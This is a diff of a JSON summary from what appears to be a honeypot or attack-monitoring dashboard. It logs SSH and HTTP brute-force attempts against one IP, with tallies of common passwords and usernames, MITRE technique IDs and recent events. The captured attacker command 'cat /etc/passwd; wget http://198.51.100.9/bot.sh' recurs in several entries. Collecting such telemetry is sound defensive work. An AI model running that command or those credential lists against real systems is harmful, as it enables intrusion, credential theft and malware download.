@@ -1,140 +1,536 @@
 {
-  "generated_at": "2026-11-03T00:22:11.310002Z",
+  "generated_at": "2026-11-03T01:43:31.433050Z",
   "window": "30 days",
   "target": "137.131.150.77",
   "totals": {
-    "events": 0,
-    "attackers": 0,
-    "sessions": 0,
+    "events": 95,
+    "attackers": 2,
+    "sessions": 26,
     "samples": 0,
     "countries": 0
   },
   "countries": [],
-  "passwords": [],
-  "usernames": [],
-  "commands": [],
-  "techniques": [],
-  "recent": [],
+  "passwords": [
+    {
+      "label": "(empty)",
+      "value": 20
+    },
+    {
+      "label": "123456",
+      "value": 2
+    },
+    {
+      "label": "admin@123",
+      "value": 1
+    },
+    {
+      "label": "qwerty",
+      "value": 1
+    },
+    {
+      "label": "asd123",
+      "value": 1
+    },
+    {
+      "label": "admin",
+      "value": 1
+    },
+    {
+      "label": "P@ssw0rd1",
+      "value": 1
+    },
+    {
+      "label": "claude",
+      "value": 1
+    },
+    {
+      "label": "password",
+      "value": 1
+    },
+    {
+      "label": "arvind@123",
+      "value": 1
+    },
+    {
+      "label": "root",
+      "value": 1
+    },
+    {
+      "label": "webadm",
+      "value": 1
+    }
+  ],
+  "usernames": [
+    {
+      "label": "root",
+      "value": 24
+    },
+    {
+      "label": "odoo18",
+      "value": 2
+    },
+    {
+      "label": "ubuntu",
+      "value": 2
+    },
+    {
+      "label": "claude",
+      "value": 2
+    },
+    {
+      "label": "admin1",
+      "value": 2
+    },
+    {
+      "label": "arvind",
+      "value": 2
+    },
+    {
+      "label": "webadm",
+      "value": 2
+    },
+    {
+      "label": "kiosk",
+      "value": 2
+    },
+    {
+      "label": "os_app_file_admin",
+      "value": 2
+    },
+    {
+      "label": "administrator",
+      "value": 1
+    }
+  ],
+  "commands": [
+    {
+      "label": "whoami; uname -a; cat /etc/passwd; wget http://198.51.100.9/bot.sh",
+      "value": 4
+    },
+    {
+      "label": "uname -s -v -n -r -m",
+      "value": 1
+    }
+  ],
+  "techniques": [
+    {
+      "id": "T1110",
+      "name": "Brute Force",
+      "events": 41
+    },
+    {
+      "id": "T1003.008",
+      "name": "OS Credential Dumping: /etc/passwd and /etc/shadow",
+      "events": 4
+    },
+    {
+      "id": "T1105",
+      "name": "Ingress Tool Transfer",
+      "events": 4
+    },
+    {
+      "id": "T1552.001",
+      "name": "Credentials In Files",
+      "events": 4
+    },
+    {
+      "id": "T1082",
+      "name": "System Information Discovery",
+      "events": 1
+    }
+  ],
+  "recent": [
+    {
+      "at": "2026-11-03T01:43:25.970000Z",
+      "ip": "77.239.124.x",
+      "country": "",
+      "kind": "ssh.auth_attempt",
+      "username": "root",
+      "password": "12qwaszx!@",
+      "command": ""
+    },
+    {
+      "at": "2026-11-03T01:43:25.024000Z",
+      "ip": "77.239.124.x",
+      "country": "",
+      "kind": "ssh.auth_attempt",
+      "username": "root",
+      "password": "",
+      "command": ""
+    },
+    {
+      "at": "2026-11-03T01:43:17.321000Z",
+      "ip": "77.239.124.x",
+      "country": "",
+      "kind": "ssh.auth_attempt",
+      "username": "admin1",
+      "password": "123456",
+      "command": ""
+    },
+    {
+      "at": "2026-11-03T01:43:16.733000Z",
+      "ip": "77.239.124.x",
+      "country": "",
+      "kind": "ssh.auth_attempt",
+      "username": "admin1",
+      "password": "",
+      "command": ""
+    },
+    {
+      "at": "2026-11-03T01:43:11.057000Z",
+      "ip": "177.60.58.x",
+      "country": "",
+      "kind": "http.login_attempt",
+      "username": "administrator",
+      "password": "P@ssw0rd",
+      "command": ""
+    },
+    {
+      "at": "2026-11-03T01:43:10.756000Z",
+      "ip": "177.60.58.x",
+      "country": "",
+      "kind": "ssh.command",
+      "username": "",
+      "password": "",
+      "command": "whoami; uname -a; cat /etc/passwd; wget http://198.51.100.9/bot.sh"
+    },
+    {
+      "at": "2026-11-03T01:43:10.734000Z",
+      "ip": "177.60.58.x",
+      "country": "",
+      "kind": "ssh.auth_attempt",
+      "username": "root",
+      "password": "password",
+      "command": ""
+    },
+    {
+      "at": "2026-11-03T01:43:10.723000Z",
+      "ip": "177.60.58.x",
+      "country": "",
+      "kind": "ssh.auth_attempt",
+      "username": "root",
+      "password": "",
+      "command": ""
+    },
+    {
+      "at": "2026-11-03T01:43:10.535000Z",
+      "ip": "177.60.58.x",
+      "country": "",
+      "kind": "ssh.command",
+      "username": "",
+      "password": "",
+      "command": "whoami; uname -a; cat /etc/passwd; wget http://198.51.100.9/bot.sh"
+    },
+    {
+      "at": "2026-11-03T01:43:10.518000Z",
+      "ip": "177.60.58.x",
+      "country": "",
+      "kind": "ssh.auth_attempt",
+      "username": "root",
+      "password": "root",
+      "command": ""
+    },
+    {
+      "at": "2026-11-03T01:43:10.509000Z",
+      "ip": "177.60.58.x",
+      "country": "",
+      "kind": "ssh.auth_attempt",
+      "username": "root",
+      "password": "",
+      "command": ""
+    },
+    {
+      "at": "2026-11-03T01:43:10.305000Z",
+      "ip": "177.60.58.x",
+      "country": "",
+      "kind": "ssh.command",
+      "username": "",
+      "password": "",
+      "command": "whoami; uname -a; cat /etc/passwd; wget http://198.51.100.9/bot.sh"
+    },
+    {
+      "at": "2026-11-03T01:43:10.283000Z",
+      "ip": "177.60.58.x",
+      "country": "",
+      "kind": "ssh.auth_attempt",
+      "username": "root",
+      "password": "admin",
+      "command": ""
+    },
+    {
+      "at": "2026-11-03T01:43:10.275000Z",
+      "ip": "177.60.58.x",
+      "country": "",
+      "kind": "ssh.auth_attempt",
+      "username": "root",
+      "password": "",
+      "command": ""
+    },
+    {
+      "at": "2026-11-03T01:43:10.088000Z",
+      "ip": "177.60.58.x",
+      "country": "",
+      "kind": "ssh.command",
+      "username": "",
+      "password": "",
+      "command": "whoami; uname -a; cat /etc/passwd; wget http://198.51.100.9/bot.sh"
+    },
+    {
+      "at": "2026-11-03T01:43:10.065000Z",
+      "ip": "177.60.58.x",
+      "country": "",
+      "kind": "ssh.auth_attempt",
+      "username": "root",
+      "password": "123456",
+      "command": ""
+    },
+    {
+      "at": "2026-11-03T01:43:10.055000Z",
+      "ip": "177.60.58.x",
+      "country": "",
+      "kind": "ssh.auth_attempt",
+      "username": "root",
+      "password": "",
+      "command": ""
+    },
+    {
+      "at": "2026-11-03T01:43:09.964000Z",
+      "ip": "77.239.124.x",
+      "country": "",
+      "kind": "ssh.auth_attempt",
+      "username": "root",
+      "password": "Password2026",
+      "command": ""
+    },
+    {
+      "at": "2026-11-03T01:43:09.419000Z",
+      "ip": "77.239.124.x",
+      "country": "",
+      "kind": "ssh.auth_attempt",
+      "username": "root",
+      "password": "",
+      "command": ""
+    },
+    {
+      "at": "2026-11-03T01:43:02.633000Z",
+      "ip": "77.239.124.x",
+      "country": "",
+      "kind": "ssh.auth_attempt",
+      "username": "root",
+      "password": "asd123",
+      "command": ""
+    },
+    {
+      "at": "2026-11-03T01:43:02.136000Z",
+      "ip": "77.239.124.x",
+      "country": "",
+      "kind": "ssh.auth_attempt",
+      "username": "root",
+      "password": "",
+      "command": ""
+    },
+    {
+      "at": "2026-11-03T01:42:56.903000Z",
+      "ip": "77.239.124.x",
+      "country": "",
+      "kind": "ssh.auth_attempt",
+      "username": "root",
+      "password": "fuckoff1",
+      "command": ""
+    },
+    {
+      "at": "2026-11-03T01:42:56.004000Z",
+      "ip": "77.239.124.x",
+      "country": "",
+      "kind": "ssh.auth_attempt",
+      "username": "root",
+      "password": "",
+      "command": ""
+    },
+    {
+      "at": "2026-11-03T01:42:49.137000Z",
+      "ip": "77.239.124.x",
+      "country": "",
+      "kind": "ssh.auth_attempt",
+      "username": "root",
+      "password": "P@ssw0rd1",
+      "command": ""
+    },
+    {
+      "at": "2026-11-03T01:42:48.379000Z",
+      "ip": "77.239.124.x",
+      "country": "",
+      "kind": "ssh.auth_attempt",
+      "username": "root",
+      "password": "",
+      "command": ""
+    },
+    {
+      "at": "2026-11-03T01:42:43.041000Z",
+      "ip": "77.239.124.x",
+      "country": "",
+      "kind": "ssh.auth_attempt",
+      "username": "arvind",
+      "password": "arvind@123",
+      "command": ""
+    },
+    {
+      "at": "2026-11-03T01:42:42.021000Z",
+      "ip": "77.239.124.x",
+      "country": "",
+      "kind": "ssh.auth_attempt",
+      "username": "arvind",
+      "password": "",
+      "command": ""
+    },
+    {
+      "at": "2026-11-03T01:42:33.592000Z",
+      "ip": "77.239.124.x",
+      "country": "",
+      "kind": "ssh.auth_attempt",
+      "username": "claude",
+      "password": "claude",
+      "command": ""
+    },
+    {
+      "at": "2026-11-03T01:42:33.321000Z",
+      "ip": "77.239.124.x",
+      "country": "",
+      "kind": "ssh.auth_attempt",
+      "username": "claude",
+      "password": "",
+      "command": ""
+    },
+    {
+      "at": "2026-11-03T01:42:28.438000Z",
+      "ip": "77.239.124.x",
+      "country": "",
+      "kind": "ssh.auth_attempt",
+      "username": "root",
+      "password": "aA123456",
+      "command": ""
+    }
+  ],
   "daily": [
     {
-      "at": "2026-10-04T00:22:11Z",
+      "at": "2026-10-04T01:43:31Z",
       "count": 0
     },
     {
-      "at": "2026-10-05T00:22:11Z",
+      "at": "2026-10-05T01:43:31Z",
       "count": 0
     },
     {
-      "at": "2026-10-06T00:22:11Z",
+      "at": "2026-10-06T01:43:31Z",
       "count": 0
     },
     {
-      "at": "2026-10-07T00:22:11Z",
+      "at": "2026-10-07T01:43:31Z",
       "count": 0
     },
     {
-      "at": "2026-10-08T00:22:11Z",
+      "at": "2026-10-08T01:43:31Z",
       "count": 0
     },
     {
-      "at": "2026-10-09T00:22:11Z",
+      "at": "2026-10-09T01:43:31Z",
       "count": 0
     },
     {
-      "at": "2026-10-10T00:22:11Z",
+      "at": "2026-10-10T01:43:31Z",
       "count": 0
     },
     {
-      "at": "2026-10-11T00:22:11Z",
+      "at": "2026-10-11T01:43:31Z",
       "count": 0
     },
     {
-      "at": "2026-10-12T00:22:11Z",
+      "at": "2026-10-12T01:43:31Z",
       "count": 0
     },
     {
-      "at": "2026-10-13T00:22:11Z",
+      "at": "2026-10-13T01:43:31Z",
       "count": 0
     },
     {
-      "at": "2026-10-14T00:22:11Z",
+      "at": "2026-10-14T01:43:31Z",
       "count": 0
     },
     {
-      "at": "2026-10-15T00:22:11Z",
+      "at": "2026-10-15T01:43:31Z",
       "count": 0
     },
     {
-      "at": "2026-10-16T00:22:11Z",
+      "at": "2026-10-16T01:43:31Z",
       "count": 0
     },
     {
-      "at": "2026-10-17T00:22:11Z",
+      "at": "2026-10-17T01:43:31Z",
       "count": 0
     },
     {
-      "at": "2026-10-18T00:22:11Z",
+      "at": "2026-10-18T01:43:31Z",
       "count": 0
     },
     {
-      "at": "2026-10-19T00:22:11Z",
+      "at": "2026-10-19T01:43:31Z",
       "count": 0
     },
     {
-      "at": "2026-10-20T00:22:11Z",
+      "at": "2026-10-20T01:43:31Z",
       "count": 0
     },
     {
-      "at": "2026-10-21T00:22:11Z",
+      "at": "2026-10-21T01:43:31Z",
       "count": 0
     },
     {
-      "at": "2026-10-22T00:22:11Z",
+      "at": "2026-10-22T01:43:31Z",
       "count": 0
     },
     {
-      "at": "2026-10-23T00:22:11Z",
+      "at": "2026-10-23T01:43:31Z",
       "count": 0
     },
     {
-      "at": "2026-10-24T00:22:11Z",
+      "at": "2026-10-24T01:43:31Z",
       "count": 0
     },
     {
-      "at": "2026-10-25T00:22:11Z",
+      "at": "2026-10-25T01:43:31Z",
       "count": 0
     },
     {
-      "at": "2026-10-26T00:22:11Z",
+      "at": "2026-10-26T01:43:31Z",
       "count": 0
     },
     {
-      "at": "2026-10-27T00:22:11Z",
+      "at": "2026-10-27T01:43:31Z",
       "count": 0
     },
     {
-      "at": "2026-10-28T00:22:11Z",
+      "at": "2026-10-28T01:43:31Z",
       "count": 0
     },
     {
-      "at": "2026-10-29T00:22:11Z",
+      "at": "2026-10-29T01:43:31Z",
       "count": 0
     },
     {
-      "at": "2026-10-30T00:22:11Z",
+      "at": "2026-10-30T01:43:31Z",
       "count": 0
     },
     {
-      "at": "2026-10-31T00:22:11Z",
+      "at": "2026-10-31T01:43:31Z",
       "count": 0
     },
     {
-      "at": "2026-11-01T00:22:11Z",
+      "at": "2026-11-01T01:43:31Z",
       "count": 0
     },
     {
-      "at": "2026-11-02T00:22:11Z",
-      "count": 0
+      "at": "2026-11-02T01:43:31Z",
+      "count": 95
     }
   ]
 }
